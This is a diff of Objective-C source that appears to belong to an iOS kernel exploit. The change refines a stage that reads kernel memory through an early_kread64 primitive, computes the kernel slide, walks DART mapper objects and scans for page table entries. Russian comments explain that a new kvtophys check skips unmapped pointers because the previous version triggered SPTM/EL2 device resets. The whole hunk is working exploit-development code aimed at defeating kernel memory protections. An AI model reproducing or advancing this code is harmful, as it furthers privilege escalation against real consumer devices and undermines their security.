@@ -6611,6 +6611,11 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         if (kpLooksLikeKernelPointer(mapVA)) dartVA = kp_untag_ptr(early_kread64(mapVA + 0x30));
         kpNote(r, [NSString stringWithFormat:@"  [P2] pipe=%#llx mapper=%#llx dart=%#llx",
                   (unsigned long long)pipeVA, (unsigned long long)mapVA, (unsigned long long)dartVA]);
+        // 1.9.163: валидация walker'а на известных VA + гейт диких дерефов —
+        // 1.9.162 ребутнул девайс без паники = SPTM/EL2 ресет на чтении
+        // немапнутого/защищённого указателя из скана dartObj.
+        kpNote(r, [NSString stringWithFormat:@"  [P2] kvtophys: provVA→%#llx dartVA→%#llx (0 = walker не резолвит zone-map)",
+                  (unsigned long long)kvtophys(provVA), (unsigned long long)kvtophys(dartVA)]);
         uint64_t pteVA = 0, origPTE = 0;
         uint64_t kslide2 = kconstant(base) - 0xfffffff007004000ULL;
         // 1.9.162 (р.37): цепочка B — verify, что mapping ПЕРСИСТИТ:
@@ -6652,15 +6657,17 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                       (unsigned long long)(dvt ? dvt - kslide2 : 0),
                       dvt - kslide2 == 0x7dafcb0 ? @" ✓" : @""]);
             uint64_t gptrs[32];
-            int gn = 0;
+            int gn = 0, gskip = 0;
             for (uint32_t o = 0; o + 8 <= 0x1000 && gn < 32; o += 8) {
                 uint64_t p = kp_untag_ptr(early_kread64(dartVA + o));
                 if (!kpLooksLikeKernelPointer(p)) continue;
                 BOOL dup = NO;
                 for (int j = 0; j < gn; j++) if (gptrs[j] == p) { dup = YES; break; }
-                if (!dup) gptrs[gn++] = p;
+                if (dup) continue;
+                if (!kvtophys(p)) { gskip++; continue; }   // 1.9.163: немапнутый → пропуск (SPTM-ресет гейт)
+                gptrs[gn++] = p;
             }
-            kpNote(r, [NSString stringWithFormat:@"  [P2] dartObj: %d указателей — сканирую страницы на PTE (PA-маска)", gn]);
+            kpNote(r, [NSString stringWithFormat:@"  [P2] dartObj: %d указателей (пропущено немапнутых %d) — сканирую страницы на PTE (PA-маска)", gn, gskip]);
             for (int g = 0; g < gn && !pteVA; g++) {
                 uint32_t lim2 = 0x4000 - (uint32_t)(gptrs[g] & 0x3fff);
                 for (uint32_t o2 = 0; o2 + 8 <= lim2; o2 += 8) {
